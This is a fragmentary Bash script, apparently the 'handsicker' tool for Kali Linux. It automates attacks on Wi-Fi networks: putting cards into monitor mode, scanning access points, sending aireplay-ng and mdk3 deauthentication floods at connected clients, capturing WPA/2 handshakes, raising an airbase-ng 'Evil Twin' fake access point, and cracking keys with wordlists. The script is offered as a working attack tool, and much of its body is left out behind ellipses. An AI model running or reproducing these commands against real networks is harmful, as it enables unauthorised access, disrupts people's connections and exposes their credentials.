...
handsicker - Detect, deauth, capture, crack WPA/2 handshakes, WPS Pins and WEP Keys automagically.  
 ...
 Require : - Kali Rolling Version 2016.2
	...
	Examples: 
		 handsicker -a -i wlan0 -T 5			 ~ Autobot mode on wlan0 and attempt 5 times.
		 handsicker -e Hub3-F -w wordlist.txt	 	 ~ Find AP like 'Hub3-F' and crack with wordlist.
		 handsicker -l -o out/dir			 ~ List all APs and save handshakes to out/dir.
		 handsicker -c handshake.cap -w wordlist.txt	 ~ Crack handshake.cap with wordlist.
...
sleep 2
	...
	then
		...
		echo " [*] Started NIC1 -> $NIC monitor ready"
	...
	then
		...
		airmon-ng start $NIC2 2> /dev/null
		echo $GRN;MON2=$(ifconfig | grep mon | cut -d ':' -f 1 );echo " [*] Started NIC2 -> $NIC2 monitor on $MON2"
	...
	then
		...
		then
			TRIES=3  #Deauthentication default value 3
		fi
		fbotstart
	fi
...
fapscan()										
{
	...
	if [ $NIC2 -z ] 2> /dev/null
	then
		gnome-terminal "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW
	else
		gnome-terminal "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW
		gnome-terminal "Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt $WPW
	fi
...
flistap()										
{
	if [ $NIC2 -z ] 2> /dev/null
	then
		gnome-terminal "Scanning for $WPW.." --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
	else
		gnome-terminal "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
		gnome-terminal "Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt $WPW&
	fi
...
fclientscan()										
{
 ...
 [*] Channel:\t\t $GRN$CHAN$RED"
	...
	then
		if [ $NIC2 -z ] 2> /dev/null
		then
			gnome-terminal "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp &
		else
			gnome-terminal "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
			gnome-terminal "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
		fi
	else
		case $CIPHER in
			"CCMP")CIPHER=4;;
...
{	
	...
	for MON in $MONS
	do
		airmon-ng stop $MON | grep dvgbc &
	done
	NICS="$(ifconfig | grep wlan | cut -d ':' -f 1)"
	echo $BLU" [*] Booster Card. "
	echo $GRN
	for CARD in $NICS
	do
		ifconfig $CARD down
	...
	MON1="$(ifconfig | grep mon | cut -d ':' -f 1 )"
	echo "ini looh adapternya $MON1"
	...
	echo $BLU" [>]$GRN AUTOBOT BERJALAN$BLU [<] "
	echo
			...
			then
				...
				then
					...
					do
						MACNUM=$((MACNUM + 1))
						echo
						aireplay-ng -0 $PACKS --ignore-negative-one -e "$ESSID" -a $BSSID -c $CLIENT $MON1 
						sleep $((PACKS + 1))'.5'
					...
					gnome-terminal "mdk3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
				...
				then
					...
					then
						...
						echo $BSSID > $HOME/BSSIDB
						gnome-terminal "MDK3 on $NIC2" --geometry=60x20+720+320 -x mdk3 $MON2 d -c $CHAN -b $HOME/BSSIDB&
						sleep 5 && killall mdk3 2> /dev/null&
						sleep 8
					fi
				else
					...
					gnome-terminal "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
					sleep 2
					MACNUM=0
...
do
	...
	case $ARG in "-r")DO='R';;
				 ...
				 "-W")WEP=1;;
				 "-B")BESS=1;;
				 "-d")PACKS=$(echo $@ | cut -d " " -f $ACNT);;
				 "-M")MDK=1;;
				 "-E")EVIL=1;;
				 "-g")GPS=1;;
				 "-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;
				 "-s")SILENT=1;;
				 "-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;
				 "-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;
				 "-T")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;
				 "-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;
				 "-l")DO='L';;
				 "-h")fhelp;;
				 "-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;
				 "-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;
				 "-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;
				 "-a")DO='A';;
				 "")fstart;
	esac
done
